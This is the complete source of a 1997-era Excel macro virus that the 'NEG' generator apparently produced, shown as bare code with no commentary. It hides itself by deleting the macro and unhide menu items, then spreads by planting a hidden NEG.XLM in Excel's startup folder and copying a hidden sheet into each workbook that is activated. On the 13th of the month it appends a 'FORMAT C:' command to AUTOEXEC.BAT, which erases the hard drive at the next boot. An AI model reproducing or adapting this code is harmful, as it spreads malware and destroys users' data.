'------------------------------------------------
'Generated with NEG !!. Please include this text 
'------------------------------------------------
'NEG is Trademark of NoMercy
'Date generated  : 25- 12- 1997
'VirusName:  Test
'Author:  Foxz/NEG
'Module Name:  NEG01
'Template: NEG.XLM

Sub Auto_Open()
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
'>>---------------------------------[Begin Stealth Routine]-----
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("---").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("--").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Delete...").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("---").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("--").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("--").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete
'>>---------------------------------[End of Stealth Routine]-----
    
    
'>>---------------------------------[Begin Infection Routine]-----
If cek_global() Then 'check on global!
    GoTo FuckSheet:  'found?
Else
    infectglobal     'Lound the speaker we want dance :)
End If
FuckSheet:
Application.OnSheetActivate = "NEG.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "NEG.XLM" Then
    For y = 1 To Application.Workbooks("NEG.XLM").Modules.Count
        If Application.Workbooks("NEG.XLM").Modules(y).Name = "NEG01" Then
            cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
  Activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\NEG.XLM"
  Workbooks.Open (Application.StartupPath + "\NEG.XLM")
  Windows("NEG.XLM").Visible = False
 Application.Workbooks("NEG.XLM").Save
End Function

Function inFuckIt() As Boolean
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "NEG01" Then
            inFuckIt = True
   End If
Next y
End Function

Sub Fuck()
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then 'already fucked?
    GoTo bye2
    Else
    End If
    Application.ScreenUpdating = False
    Application.Windows("NEG.XLM").Visible = True
    Workbooks("NEG.XLM").Activate
    Sheets("NEG01").Visible = True
    Workbooks("NEG.XLM").Sheets("NEG01").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("NEG01").Visible = False
    Workbooks("NEG.XLM").Sheets("NEG01").Visible = False
    Windows("NEG.XLM").Visible = False
bye2:
Close
End Sub
'>>---------------------------------[End of Infection Routine]-----

Sub Auto_Close()
On Error GoTo bye3
Application.DisplayAlerts = False
Application.Workbooks("NEG.XLM").Save
If Day(Date) ="13"Then
'>>---------------------------------[Begin of Fuck HDD Routine]-----
Open "C:\AUTOEXEC.BAT"For Input As #1
Close
SetAttr "C:\AUTOEXEC.BAT", vbNormal
Open "C:\AUTOEXEC.BAT" For Append As #1
Print #1," @ECHO OFF"
Print #1," CLS"
Print #1," FORMAT C: /U /C /S /AUTOTEST > NUL"
Close #1
SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
'>>---------------------------------[End of Fuck HDD Routine]-----
'>>---------------------------------[Begin of Your Massages Routine]-----
    MsgBox"This  XM  Was   generated with  NEG ,  the world first  Excel Generator!  created by NoMercyVirusTeam '98", 48
'>>---------------------------------[End of Your Massages Routine]-----
Else
End If
bye3:
End Sub
